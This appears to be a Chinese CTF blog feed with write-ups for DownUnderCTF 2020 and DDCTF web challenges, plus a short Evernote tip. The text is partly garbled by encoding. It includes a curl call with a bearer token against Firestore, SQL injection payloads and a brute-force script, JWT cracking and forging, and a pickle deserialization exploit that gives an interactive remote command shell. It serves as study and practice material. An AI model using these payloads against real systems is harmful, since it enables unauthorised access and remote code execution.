id="Cookie-Clickerï¼ˆé€»è¾‘æ¼æ´ï¼‰"><a href="#Cookie-Clickerï¼ˆé€»è¾‘æ¼æ´ï¼‰" class="headerlink" title="Cookie Clickerï¼ˆé€»è¾‘æ¼æ´ï¼‰"></a>Cookie Clickerï¼ˆé€»è¾‘æ¼æ´ï¼‰</h1><ul><li>é¢˜ç›®åœ°å€ï¼š<a href="https://cookie-clicker1.web.app/">https://cookie-clicker1.web.app/</a></li><li>å®˜æ–¹é¢˜è§£ï¼š<a href="https://github.com/DownUnderCTF/Challenges_2020_public/blob/master/web/cookie-clicker/solution.md">https://github.com/DownUnderCTF/Challenges_2020_public/blob/master/web/cookie-clicker/solution.md</a></li><li>é¢˜è§£åœ°å€ï¼š<a href="https://github.com/joaofcmb/DownUnderCTF-writeups/tree/master/web/cookie-clicker">https://github.com/joaofcmb/DownUnderCTF-writeups/tree/master/web/cookie-clicker</a></li></ul><p>Click da cookie and you get to increase da cookie. Built this using epic Firebase. Built this in a day HOW COOL is firebase! Didnâ€™t need to worry about security because itâ€™s all handled by Google :) just click cookies and enjoy</p><p>WriteUpï¼šæˆ‘ä»é¢˜ç›®ä¸­æå–åˆ°çš„å…³é”®è¯æ˜¯ epic Firebaseï¼ŒFlag å¯èƒ½å’Œ Firebase æœ‰å…³ã€‚å°†ç›¸å…³ç®€å•æµç¨‹æ“ä½œäº†ä¸€ä¸‹ï¼Œå¹¶æœªå‘ç°å¼‚å¸¸æƒ…å†µï¼ˆçœ‹äº†ä¸€ä¸‹è¯·æ±‚å‚æ•°ï¼Œå¤ªå¤æ‚äº†ï¼‰ã€‚é¢˜ç›®ä¸­è¿˜æ¶‰åŠ Googleï¼Œå¿ƒç”Ÿæ•¬ç•ä¹‹å¿ƒï¼Œç®€å•æŸ¥çœ‹æºæ–‡ä»¶ä¹‹åæœæ–­æ”¾å¼ƒï¼ˆè¿™ç§å¤§å‹ç½‘ç«™ä»æ¥æ²¡åšè¿‡ã€‚</p><p>æŸ¥çœ‹é¢˜è§£è¿‡åå‘ç°ç¬¬ä¸€æ­¥çš„æ€è·¯æ˜¯æ­£ç¡®çš„ï¼Œä½†æ˜¯æ²¡æœ‰å»æœç´¢ Firebaseã€‚Firestore æ˜¯ä¸€ä¸ªæ•°æ®åº“æœåŠ¡ï¼Œå¹¶ä¸” WriteUp æåˆ°ã€ŒFirebase æœ‰ä¸€ä¸ªå…³é”®çš„å®‰å…¨é—®é¢˜â€”â€”è®¾ç½®è®¿é—®æ§åˆ¶ï¼Œå¦åˆ™ä»»æ„ç”¨æˆ·éƒ½èƒ½è®¿é—®æ•°æ®ã€ã€‚</p><blockquote><p>noteï¼šå¤§å‹æœåŠ¡å•†ï¼ˆGoogleï¼‰æä¾›çš„æœåŠ¡é€šå¸¸çš„é—®é¢˜éƒ½å‡ºåœ¨é…ç½®é—®é¢˜ã€‚ï¼ˆä¸ç„¶æ—©å°±ä¿®å¤äº†</p></blockquote><p>ç„¶åè§‚å¯Ÿé¢˜ç›®å‘é€çš„è¯·æ±‚ï¼ˆæ³¨æ„è§‚å¯Ÿå­˜åœ¨å…³é”®è¯çš„è¯·æ±‚ï¼‰ï¼Œç¬¬ä¸€æ¬¡è¯·æ±‚å’Œåé¢çš„è¯·æ±‚ä¸ç›¸åŒï¼Œé€šå¸¸åº”è¯¥è”æƒ³åˆ°ç¬¬ä¸€æ¬¡è¯·æ±‚æ˜¯åœ¨ç”³è¯·æˆæƒã€‚æŒ‰ç…§ <a href="https://firebase.google.com/docs/firestore/use-rest-api">Cloud Firestore API</a> çš„æ•™ç¨‹ï¼Œä½¿ç”¨ç”³è¯·æˆæƒçš„ä¿¡æ¯å‘ Firebase è¿›è¡ŒéªŒè¯å³å¯å¾—åˆ° flagã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash"><br>curl -H <span class="hljs-string">&quot;Authorization:Bearer eyJhbGciOiJSUzI1NiIsImtpZCI6IjczNzVhZmY3MGRmZTNjMzNlOTBjYTM2OWUzYTBlZjQxMzE3MmZkODIiLCJ0eXAiOiJKV1QifQ.eyJpc3MiOiJodHRwczovL3NlY3VyZXRva2VuLmdvb2dsZS5jb20vY29va2llLWNsaWNrZXIxIiwiYXVkIjoiY29va2llLWNsaWNrZXIxIiwiYXV0aF90aW1lIjoxNjAwNjE1MDYzLCJ1c2VyX2lkIjoiRXVhUkdDU2t0R040Nnh0MWdBRUgzbEw5MkFyMSIsInN1YiI6IkV1YVJHQ1NrdEdONDZ4dDFnQUVIM2xMOTJBcjEiLCJpYXQiOjE2MDA2MTgzNjYsImV4cCI6MTYwMDYyMTk2NiwiZW1haWwiOiJrZWt3QGtla3cua2VrdyIsImVtYWlsX3ZlcmlmaWVkIjpmYWxzZSwiZmlyZWJhc2UiOnsiaWRlbnRpdGllcyI6eyJlbWFpbCI6WyJrZWt3QGtla3cua2VrdyJdfSwic2lnbl9pbl9wcm92aWRlciI6InBhc3N3b3JkIn19.cHgPEFjfZ0J408lkrRfow_3iIsiLYTd1EVIP28NSvj9ZQIKdY6sZtIJ7XPpeVCcxWcswx9tv4Ftv6uNkgF67HeAccyY7I9YwDQuhWrPIAGMNBbQ2qoq19YbpfLy_Ot-0LRE8z9jpPL8uwEDyy8vX_PPPZAmcFHX3nQe1ltvMWDLGVeIUP4F-tDtHX5NGL-UngGPvEAg6qfpzY5tax6NzPwi-HDRDLHLPa4ayiQurwAw2hs0CTOwvbMDjf8YzoNeL0fscukyOPsFZOw-0L0nQbO4FF0GdfZLLski4VvD0XK8N9lkc_Vtn0cqZ1bN3f7Sof28KAvNf5Is-_JnO6fxz1g&quot;</span> <span class="hljs-string">&quot;https://firestore.googleapis.com/v1/projects/cookie-clicker1/databases/(default)/documents/cookies&quot;</span><br><br></code></pre></td></tr></table></figure><p>å®˜æ–¹çš„ writeup åˆ™æ˜¯ä½¿ç”¨ firestore åœ¨æºç ä¸­æœç´¢èƒ½æ‰¾åˆ°ç™»é™†çš„å…³é”®å‡­è¯ï¼Œä½†åé¢çš„æ­¥éª¤å°±å¾ˆéš¾è”æƒ³åˆ°ã€‚ï¼ˆè¿™ä¸ªé¢˜è„‘æ´æ˜¯çœŸæ»´å¤§</p><hr><h1 id="CicleSpaceï¼ˆSQLæ³¨å…¥ï¼‰"><a href="#CicleSpaceï¼ˆSQLæ³¨å…¥ï¼‰" class="headerlink" title="CicleSpaceï¼ˆSQLæ³¨å…¥ï¼‰"></a>CicleSpaceï¼ˆSQLæ³¨å…¥ï¼‰</h1><ul><li>é¢˜ç›®é“¾æ¥ï¼š<a href="https://chal.duc.tf:30103/">https://chal.duc.tf:30103/</a></li><li>é¢˜è§£é“¾æ¥ï¼š<a href="https://github.com/DownUnderCTF/Challenges_2020_public/blob/master/web/circlespace/writeup.md">https://github.com/DownUnderCTF/Challenges_2020_public/blob/master/web/circlespace/writeup.md</a></li></ul><p>Oh, how I miss /r/place and /r/circleoftrust. Thatâ€™s why I decided to create my own one for yâ€™all to play with.<br>/* some bruteforce may be required */</p><p>çŒœæµ‹ä¸ºSQLæ³¨å…¥ï¼Œä½†æ˜¯æ²¡æœ‰æˆåŠŸæ³¨å…¥ã€‚å‘é€ç©ºæ•°æ®æ—¶ï¼Œè¿”å›æŠ¥é”™ï¼ˆ400ï¼‰ã€‚</p><p>æŸ¥çœ‹é¢˜è§£åå‘ç°ï¼Œfuzz SQLæ³¨å…¥æ—¶ï¼Œæœ€å¥½æŠŠè‡ªå·±å†™å…¥çš„å‚æ•°åˆ æ‰ï¼ˆå‚æ•°ä¸ºç©ºï¼‰ã€‚å‚è€ƒé¢˜è§£çš„ payloadï¼Œæ·»åŠ åä¸º 1 çš„ Personï¼Œç„¶åå†åˆ†åˆ«ä½¿ç”¨ï¼š<code>1&quot; AND 1=0  #</code>ï¼Œ<code>1&quot; AND 1=1  #</code> è¿›è¡ŒæŸ¥è¯¢ï¼Œå³å¯å‘ç°ä¸º Boolean æ³¨å…¥ï¼Œç„¶åä½¿ç”¨ Boolean æ³¨å…¥çš„æ–¹æ³•è¿›è¡Œçˆ†ç ´å³å¯ã€‚ï¼ˆä½¿ç”¨ <code>2&quot; # </code> ä¹Ÿèƒ½æŸ¥å‡ºæ¥ï¼‰</p><blockquote><p>ç»†å¿ƒä¸€ç‚¹æµ‹è¯•ï¼Œè¿™ä¸ªé¢˜åº”è¯¥èƒ½åšï¼ˆ</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs python"><br><span class="hljs-comment">#!/usr/bin/python3</span><br><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> string<br><br>CHARSET = list(string.ascii_lowercase + string.digits) + [<span class="hljs-string">&#x27;\\_&#x27;</span>, <span class="hljs-string">&#x27;-&#x27;</span>, <span class="hljs-string">&#x27;&#123;&#x27;</span>, <span class="hljs-string">&#x27;&#125;&#x27;</span>]<br>CHARSET_CASE_SENSITIVE = list(string.ascii_lowercase + string.ascii_uppercase + string.digits) + [<span class="hljs-string">&#x27;\\_&#x27;</span>, <span class="hljs-string">&#x27;-&#x27;</span>, <span class="hljs-string">&#x27;&#123;&#x27;</span>, <span class="hljs-string">&#x27;&#125;&#x27;</span>]<br><br>BASE_URL = <span class="hljs-string">&quot;http://localhost:5000&quot;</span><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">query</span>(<span class="hljs-params">url: str, sql: str, result: list, charset=CHARSET, current=<span class="hljs-string">&quot;&quot;</span></span>):</span><br>    found = <span class="hljs-literal">False</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> charset:<br>        r = s.get(url, params=&#123;<span class="hljs-string">&quot;name&quot;</span>: sql.format(current + i + <span class="hljs-string">&quot;%&quot;</span>)&#125;)<br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;is not part&quot;</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> r.text:<br>            found = <span class="hljs-literal">True</span><br>            res = query(url, sql, result, charset=charset, current=current + i)<br>            <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> res:<br>                result.append(current + i)<br>    <span class="hljs-keyword">return</span> found<br>      <br>s = requests.Session()<br><span class="hljs-comment"># create a circle</span><br>r = s.post(<span class="hljs-string">f&quot;<span class="hljs-subst">&#123;BASE_URL&#125;</span>/create&quot;</span>, data=&#123;<span class="hljs-string">&quot;name&quot;</span>: <span class="hljs-string">&quot;lol&quot;</span>&#125;)<br>circle_url = r.url<br><br><span class="hljs-comment"># find the right table</span><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">get_tables</span>():</span><br>    q = <span class="hljs-string">&#x27;&quot; AND 1=0 UNION SELECT 1 FROM information_schema.tables WHERE table_type=&quot;BASE TABLE&quot; AND table_schema=&quot;circlespace&quot; AND table_name LIKE &quot;&#123;&#125;&quot; -- a&#x27;</span><br>    tables = []<br>    query(<span class="hljs-string">f&quot;<span class="hljs-subst">&#123;circle_url&#125;</span>/people&quot;</span>, q, tables)<br>    <span class="hljs-keyword">return</span> tables<br><br>print(get_tables())<br><br></code></pre></td></tr></table></figure><hr><h1 id="Taking-Stockï¼ˆPythonåºåˆ—åŒ–ï¼‰"><a href="#Taking-Stockï¼ˆPythonåºåˆ—åŒ–ï¼‰" class="headerlink" title="Taking Stockï¼ˆPythonåºåˆ—åŒ–ï¼‰"></a>Taking Stockï¼ˆPythonåºåˆ—åŒ–ï¼‰</h1><p>é¢˜ç›®åœ°å€ï¼š<a href="https://chal.duc.tf:30104/">https://chal.duc.tf:30104/</a></p><p>After taking one unit of AI at uni Iâ€™m now a pro. My linear regression model is amazing at predicting the stock market. Iâ€™m so proud of it Iâ€™m even offering it as a service. Canâ€™t wait to get that VC money!</p><p>é¢˜è§£é“¾æ¥ï¼š<a href="https://github.com/DownUnderCTF/Challenges_2020_public/tree/master/web/taking-stock">https://github.com/DownUnderCTF/Challenges_2020_public/tree/master/web/taking-stock</a></p><p>ç™»é™†åå¯ä»¥å‘ç°ï¼ŒProfile Picture æ³„æ¼äº† uuidã€‚è§£ç  session åè·å¾— <code>&#123;&quot;id&quot;:&quot;74795b25-010e-4fca-9e7b-ae05a000d089&quot;,&quot;username&quot;:&quot;1&quot;&#125;_q?G??&#39;1v8aF??j?????&gt;p?4</code>ã€‚å’Œå›¾ç‰‡çš„ uuidï¼ˆ<code>&lt;img src=&quot;/profile-picture/74795b25-010e-4fca-9e7b-ae05a000d089&quot; alt=&quot;Profile Picture&quot;&gt;</code>ï¼‰ ç›¸åŒã€‚</p><p>åœ¨ stock ä½ç½®æœ‰ç›®å½•ç©¿è¶Šï¼Œä¹Ÿå°±æ„å‘³ç€ joblib ååºåˆ—æ—¶ï¼Œå¯ä»¥æŒ‡å®šä¸ºè‡ªå·±ä¸Šä¼ çš„æ–‡ä»¶ã€‚</p><p>åŸºæœ¬æ€è·¯ï¼šæ„å»º payloadï¼ˆå‘½ä»¤æ‰§è¡Œç»“æœå†™å›æ–‡ä»¶ï¼‰ -&gt; å‘½ä»¤åºåˆ—åŒ–åå­˜å…¥æ–‡ä»¶ -&gt; å°†æ–‡ä»¶åšä¸ºå¤´åƒä¼ å…¥ç³»ç»Ÿ -&gt; åœ¨ stock å¤„ååºåˆ—åŒ–ä¸Šä¼ çš„æ–‡ä»¶ -&gt; è¯»å–å¤´åƒã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><code class="hljs python"><br><span class="hljs-keyword">import</span> json<br><span class="hljs-keyword">import</span> base64 <span class="hljs-keyword">as</span> b64<br><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> joblib<br><span class="hljs-keyword">import</span> io<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">base64Padding</span>(<span class="hljs-params">data</span>):</span><br>    missing_padding = <span class="hljs-number">4</span> - len(data) % <span class="hljs-number">4</span><br>    <span class="hljs-keyword">if</span> missing_padding:<br>        data += <span class="hljs-string">&#x27;=&#x27;</span> * missing_padding<br>    <span class="hljs-keyword">return</span> data<br><br>REMOTE = <span class="hljs-string">&#x27;https://chal.duc.tf:30104/&#x27;</span><br>session = requests.Session()<br><br><span class="hljs-comment"># 1. ç™»é™†</span><br>resp = session.post(<span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;REMOTE&#125;</span>/login&#x27;</span>, data=&#123;<br>    <span class="hljs-string">&#x27;username&#x27;</span>: <span class="hljs-string">&#x27;hacker&#x27;</span><br>&#125;)<br><br><span class="hljs-comment"># 2ã€‚ è·å– Cookie</span><br>token = json.loads(<br>    b64.b64decode(base64Padding(session.cookies[<span class="hljs-string">&#x27;session&#x27;</span>].split(<span class="hljs-string">&#x27;.&#x27;</span>)[<span class="hljs-number">0</span>])).decode()<br>)<br>uid = token[<span class="hljs-string">&#x27;id&#x27;</span>]<br><br>resp = session.get(<span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;REMOTE&#125;</span>/profile-picture/<span class="hljs-subst">&#123;uid&#125;</span>&#x27;</span>)<br><br>remote_path = resp.text.split(<span class="hljs-string">&#x27; &#x27;</span>)[<span class="hljs-number">-1</span>].replace(<span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;uid&#125;</span>.png&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>).rstrip(<span class="hljs-string">&#x27;/&#x27;</span>)<br><span class="hljs-comment"># print(remote_path)</span><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">make_payload</span>(<span class="hljs-params">cmd</span>):</span><br>    payload = <span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;cmd&#125;</span> &gt; <span class="hljs-subst">&#123;remote_path&#125;</span>/<span class="hljs-subst">&#123;uid&#125;</span>.png&#x27;</span><br>    <span class="hljs-comment"># print(payload)</span><br><br>    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Model</span>:</span><br>        <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__reduce__</span>(<span class="hljs-params">self</span>):</span><br>            <span class="hljs-keyword">return</span> (os.system, (payload,))<br><br>    <span class="hljs-keyword">return</span> Model()<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">exec_cmd</span>(<span class="hljs-params">cmd</span>):</span><br>    <span class="hljs-comment"># å°† payload åºåˆ—åŒ–åå†™å…¥æ–‡ä»¶ã€‚</span><br>    tmpfile = io.BytesIO()<br>    joblib.dump(make_payload(cmd), tmpfile)<br>    tmpfile.seek(<span class="hljs-number">0</span>)<br>    <br>    <span class="hljs-comment"># session ä¸Šä¼ æ–‡ä»¶</span><br>    resp = session.post(<br>        url=<span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;REMOTE&#125;</span>/profile-picture&#x27;</span>,<br>        files=&#123;<br>            <span class="hljs-string">&#x27;img&#x27;</span>: (<span class="hljs-string">&#x27;1.png&#x27;</span>, tmpfile)<br>        &#125;<br>    )<br>    <br>    <span class="hljs-comment"># å®šä½é—®é¢˜çš„ä½ç½®</span><br>    <span class="hljs-keyword">assert</span> resp.ok<br>    <br>    <span class="hljs-comment"># ä½¿è¿è¡Œæ–‡ä»¶ä¸­åºåˆ—åŒ–çš„å‘½ä»¤</span><br>    resp = session.post(<br>        url=<span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;REMOTE&#125;</span>/predict&#x27;</span>,<br>        data=&#123;<br>            <span class="hljs-string">&#x27;stock&#x27;</span>: <span class="hljs-string">&#x27;../&#x27;</span> * <span class="hljs-number">16</span> + <span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;remote_path&#125;</span>/<span class="hljs-subst">&#123;uid&#125;</span>.png&#x27;</span>,<br>            <span class="hljs-string">&#x27;prices&#x27;</span>: <span class="hljs-string">&#x27;1,2&#x27;</span><br>        &#125;<br>    )<br>    <br>    <span class="hljs-comment"># è¯»å–å‘½ä»¤æ‰§è¡Œçš„ç»“æœ</span><br>    resp = session.get(<span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;REMOTE&#125;</span>/profile-picture/<span class="hljs-subst">&#123;uid&#125;</span>&#x27;</span>)<br>    <span class="hljs-keyword">return</span> resp.text<br><br><span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>    cmd = input()<br>    print(exec_cmd(cmd))<br>    print(<span class="hljs-string">&#x27;----------------------------&#x27;</span>)<br><br></code></pre></td></tr></table></figure><hr><h1 id="Design-COMP"><a href="#Design-COMP" class="headerlink" title="Design COMP"></a>Design COMP</h1><p>é¢˜ç›®é“¾æ¥ï¼š<a href="https://chal.duc.tf:30105/">https://chal.duc.tf:30105/</a></p><p>Come join our homepage design competition and test out your CSS skills!<br>Snippet of admin code: <a href="https://gist.github.com/uint0/21e677a7daf177f115486b9f952037da">https://gist.github.com/uint0/21e677a7daf177f115486b9f952037da</a></p><p>é¢˜è§£é“¾æ¥ï¼š<a href="https://github.com/DownUnderCTF/Challenges_2020_public/tree/master/web/design-comp">https://github.com/DownUnderCTF/Challenges_2020_public/tree/master/web/design-comp</a></p>]]></content>
    
    
    <categories>
      
      <category>å®‰å…¨</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>è§£å†³å°è±¡ç¬”è®°ç²˜è´´ä»£ç ç¼©è¿›æ··ä¹±çš„é—®é¢˜</title>
    <link href="/2020/09/30/2020%E5%B9%B49%E6%9C%8830%E6%97%A5-%E5%8D%B0%E8%B1%A1%E7%AC%94%E8%AE%B0/"/>
    <url>/2020/09/30/2020%E5%B9%B49%E6%9C%8830%E6%97%A5-%E5%8D%B0%E8%B1%A1%E7%AC%94%E8%AE%B0/</url>
    
    <content type="html"><![CDATA[<p>ä»ç½‘é¡µä¸­ç²˜è´´ä»£ç åˆ°å°è±¡ç¬”è®°ç»å¸¸ä¼šå‡ºç°ç¼©è¿›å¤±æ•ˆ.</p><a id="more"></a><ul><li><p>ä½¿ç”¨ Ctrl + V ç›´æ¥è¿›è¡Œç²˜è´´çš„ç»“æœã€‚<br><img src="https://blog-1256032382.cos.ap-nanjing.myqcloud.com/img/20200930095549.png"></p></li><li><p>å…ˆç²˜è´´åˆ° VScodeï¼Œå†å¤åˆ¶ vscode ä¸­çš„ä»£ç è¿›è¡Œç²˜è´´(å¯æ˜¯æˆ‘ä¸æƒ³å†æ‰“å¼€ vscode)<br><img src="https://blog-1256032382.cos.ap-nanjing.myqcloud.com/img/20200930095611.png"></p></li><li><p>ä½¿ç”¨ Alfred çš„å‰ªè´´æ¿ï¼Œå¾—åˆ°çš„ç»“æœå’Œ vscode ç›¸åŒã€‚</p></li></ul>]]></content>
    
    
    <categories>
      
      <category>ç”Ÿæ´»</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>2020å¹´9æœˆDDCTFé¢˜è§£</title>
    <link href="/2020/09/14/2020%E5%B9%B49%E6%9C%8814%E6%97%A5-DDCTF/"/>
    <url>/2020/09/14/2020%E5%B9%B49%E6%9C%8814%E6%97%A5-DDCTF/</url>
    
    <content type="html"><![CDATA[<p>æŒºéš¾çš„ï¼ˆ</p><a id="more"></a><h1 id="webï¼šwebç­¾åˆ°é¢˜"><a href="#webï¼šwebç­¾åˆ°é¢˜" class="headerlink" title="webï¼šwebç­¾åˆ°é¢˜"></a>webï¼šwebç­¾åˆ°é¢˜</h1><p>ä¸ªäººè§‰å¾—æŒºéš¾çš„ï¼Œåªåšå‡ºæ¥ä¸€é“é¢˜ï¼Œè€Œä¸”è¿™é“é¢˜éœ€è¦ pwn å’Œ web ç›¸ç»“åˆã€‚</p><h2 id="æ­¥éª¤1ï¼šJWTç»•è¿‡"><a href="#æ­¥éª¤1ï¼šJWTç»•è¿‡" class="headerlink" title="æ­¥éª¤1ï¼šJWTç»•è¿‡"></a>æ­¥éª¤1ï¼šJWTç»•è¿‡</h2><p>å›¾1:é¢˜ç›®ç»™å®šåˆå§‹æ¡ä»¶ã€‚<br><img src="https://blog-1256032382.cos.ap-nanjing.myqcloud.com/img/20200913233709.png"></p><p>å‘ api å‘é€è¯·æ±‚ï¼Œå¾—åˆ°å“åº”å¦‚ä¸‹ï¼Œdata çš„æ•°æ®æ ¼å¼å’Œ jwt ç›¸ä¼¼ï¼ŒçŒœæµ‹ä¸º jwt ç»•è¿‡ã€‚</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs json">&#123;<br><span class="hljs-attr">&quot;code&quot;</span>: <span class="hljs-number">0</span>,<br><span class="hljs-attr">&quot;message&quot;</span>: <span class="hljs-string">&quot;success&quot;</span>,<br><span class="hljs-attr">&quot;data&quot;</span>: <span class="hljs-string">&quot;eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyTmFtZSI6InN0ciIsInB3ZCI6InN0ciIsInVzZXJSb2xlIjoiR1VFU1QiLCJleHAiOjE1OTkyODY0NzB9.z-i_zjudu5yejiFbCnE9P5NIjOJE61Bzpw75OX1SHmg&quot;</span><br>&#125;<br></code></pre></td></tr></table></figure><p>æˆ‘åªåšè¿‡ä¸€æ¬¡ JWT ç»•è¿‡çš„é¢˜ç›®ï¼Œå¹¶ä¸”å½“æ—¶è®°ç¬”è®°çš„ä¹ æƒ¯ä¸å¥½ï¼Œæ—©å·²å¿˜è®°ã€‚äºæ˜¯å…ˆæŸ¥è¯¢äº†ä¸€ä¸‹ <a href="evernote:///view/24913208/s27/10cd3f6d-645f-475a-a439-8efbdaba360c/10cd3f6d-645f-475a-a439-8efbdaba360c/">JWT ç›¸å…³åŸç†å’ŒåŸºæœ¬æ­¥éª¤</a>ï¼Œåˆç•¥æŒ‡å¯¼è¯¥æ¼æ´å¯ä»¥ä½¿ç”¨ 5 ç§æ–¹å¼è¿›è¡Œæ”»å‡»ã€‚è€ƒè™‘ä»æœ€ç®€å•çš„æš´åŠ›ç ´è§£ key å¼€å§‹å°è¯•ï¼Œä½¿ç”¨ <a href="https://delcoding.github.io/2018/03/jwt-bypass/">Junay å¤§ä½¬åšå®¢</a>æ¨èçš„<a href="https://github.com/brendan-rius/c-jwt-cracker">å·¥å…·</a>è¿›è¡Œå°è¯•ï¼Œçˆ†ç ´å‡ºå¯†ç ä¸º strï¼ˆä¸åŒçš„äººå¯†ç å¯èƒ½ä¸åŒï¼‰ï¼Œç„¶ååˆ° <a href="https://jwt.io/">https://jwt.io/</a> è¿›è¡Œ jwt ä¼ªé€ ï¼Œå°†ä¼ªé€ åçš„ jwt å‘é€åˆ° auth interface å¾—åˆ° client ä¸‹è½½é“¾æ¥ã€‚</p><p>å›¾2:çˆ†ç ´å¾—åˆ°çš„å¯†ç <br><img src="https://blog-1256032382.cos.ap-nanjing.myqcloud.com/img/20200913233726.png"></p><h2 id="æ­¥éª¤2ï¼šé€†å‘ç»•è¿‡å®¢æˆ·ç«¯"><a href="#æ­¥éª¤2ï¼šé€†å‘ç»•è¿‡å®¢æˆ·ç«¯" class="headerlink" title="æ­¥éª¤2ï¼šé€†å‘ç»•è¿‡å®¢æˆ·ç«¯"></a>æ­¥éª¤2ï¼šé€†å‘ç»•è¿‡å®¢æˆ·ç«¯</h2><p>è·å¾— client åï¼Œç”±é˜Ÿé‡Œçš„å…¶ä»–å¤§ä½¬è¿›è¡Œé€†å‘åˆ†æï¼Œå¹¶åˆ¶ä½œæ¨¡æ‹Ÿå®¢æˆ·ç«¯çš„å·¥å…·ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># -*- coding: utf-8 -*-</span><br><span class="hljs-keyword">from</span> base64 <span class="hljs-keyword">import</span> b64encode<br><span class="hljs-keyword">import</span> hmac<br><span class="hljs-keyword">import</span> hashlib<br><span class="hljs-keyword">from</span> time <span class="hljs-keyword">import</span> time<br><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> json<br><span class="hljs-keyword">from</span> pprint <span class="hljs-keyword">import</span> pprint<br><br><span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>Â  Â  cmd = input()Â  <span class="hljs-comment"># 